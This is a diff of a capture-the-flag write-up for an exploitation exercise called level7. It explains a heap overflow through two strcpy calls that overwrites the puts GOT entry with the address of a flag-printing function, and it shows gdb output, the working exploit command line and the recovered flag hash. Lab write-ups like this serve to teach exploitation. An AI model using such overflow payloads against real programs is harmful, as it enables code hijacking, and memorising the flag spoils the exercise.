@@ -1,8 +1,45 @@
-(wip)
-use the first argument to overide the adress of the second malloc with the adress of puts 
-use the second argument to swap the address of puts with the adress of m in the second strcpy
-when puts is called it will instead call the fonction m who will print the flag
+solution level7:
 
-./level7 `python -c 'print "A" * 20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
+-> the main starts by allocating 8 bytes and storing the return address:
+- the integer "1" is stored in the first 4 bytes
+- the return address of another malloc of 8 bytes is stored in the last 4 bytes
 
-5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+-> the main repeats the above, this time:
+- the integer "2" is stored in the first 4 bytes
+- the return address of another malloc of 8 bytes is stored in the last 4 bytes
+
+-> next, main calls strcpy with the address stored at the last 4 bytes of the first allocation zone as destination, and argv[1] as source
+
+-> then, main calls strcpy a second time with the address stored at the last 4 bytes of the second allocation as destination, and argv[2] as source
+
+-> the flag (.pass) is then fetched with fopen and stored in the buffer called c with the fgets method
+
+-> finally the method puts is called
+
+-> we also notice the existence of function "m", which prints our buffer "c"
+
+-> if we could call this function "m", we could display the flag we want
+
+-> we know we can overwrite addresses by overflowing with the strcpy method
+
+-> we are going to make the call to puts at <main+214> execute function "m":
+- the first strcpy will overwrite the last 4 bytes of the second allocation zone with the address of puts
+- the second strcpy will overwrite the address of puts with the address of function "m", which is 0x080484f4
+
+by checking the addresses returned by malloc, we find out there are 32 bytes between the 2 addresses stored in the main
+there is a 24 bytes difference between the destination address we pass to the first strcpy and the address we want to reach (the destination address we pass to the second strcpy)
+
+> (gdb) disass main
+...
+0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+...
+> (gdb) disass 0x8048400
+...
+0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
+...
+> (gdb) x 0x8049928
+0x8049928 <puts@got.plt>:	0x08048406
+This is the address we want to replace.
+
+> ./level7 `python -c 'print "A" * 20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
+> 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
